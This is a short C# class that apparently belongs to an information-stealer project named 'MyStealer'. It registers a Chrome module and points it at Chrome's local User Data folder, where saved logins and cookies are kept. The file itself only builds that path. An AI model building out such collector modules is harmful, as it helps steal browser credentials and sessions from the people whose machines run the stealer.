using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Chrome : Chromium
    {
        public override string ModuleName => "Chrome";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data");
    }
}
